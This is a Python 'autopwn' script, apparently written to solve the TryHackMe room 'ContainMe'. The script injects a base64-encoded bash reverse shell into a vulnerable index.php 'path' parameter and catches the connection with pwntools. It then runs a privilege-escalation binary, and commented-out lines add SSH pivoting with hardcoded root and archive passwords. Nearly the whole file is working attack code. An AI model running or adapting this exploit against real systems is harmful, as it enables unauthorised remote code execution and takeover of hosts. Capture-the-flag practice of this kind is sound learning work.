#!/usr/bin/env python3

# Autopwn script of the room ContainMe on try hackme

import sys
import requests
import base64
import threading
from pwn import *
import time

#check if sufficient arguments are there
if len(sys.argv) != 3:
	print("Usage: ./exploit.py <TARGET IP> <LHOST>")
	sys.exit(1)

#important arguments
RHOSTS = sys.argv[1]
LHOST = sys.argv[2]
LPORT = 1234

def countdown(t):
    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r")
        time.sleep(1)
        t -= 1

#function to create the rev shell
def rev_shell():
	cmd = f"sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1" # bash reverse shell
	encoded_cmd = (base64.b64encode(cmd.encode())).decode() # encode the reverse shell
	data = requests.get(f"http://{RHOSTS}/index.php?path=/;echo {encoded_cmd} | base64 -d | bash")

try:
	t1 = threading.Thread(target=rev_shell) # start thread to handle the rev shell request
	t1.daemon = True
	t1.start()
	listener = listen(LPORT).wait_for_connection()
	listener.sendline(b"/bin/bash -i") # without this, privesc will break
	listener.sendline(b"/usr/share/man/zh_TW/./crypt mike")  #privesc to root on host1
	print("[*] A few minutes for Privesc")
	countdown(360)
	listener.sendline(b"export TERM=xterm")
	
		"""
		 uncomment the following to login into the second host and get the flag using the creds. HOWEVER, the code is unstable as
		 SSH-ing using the script has proved difficult. The better method is set a proxy to pivot into the second network but I"m too tired
		 to put that into the script :)..sorry.Just do what the uncommented lines do manually. Set up a proxy using the creds in host1 then
		 get your way to the flag 
		"""

	#listener.sendline(b"ssh mike@172.16.20.6 -i /home/mike/.ssh/id_rsa -y")
	#listener.sendline(b"su root")
	#listener.sendline(b"bjsig4868fgjjeog")
	#listener.sendline(b"unzip /root/mike.zip -P WhatAreYouDoingHere")
	#listener.sendline(b"cat /root/mike")
	#print(listener.recvline().decode())

	listener.interactive()
except:
	print("error")
	sys.exit(1)

# kmbh1WaL5ibpZHbhNkL2YzQ2YkN3cDew4iZs92duAkLy9Ga0VXY
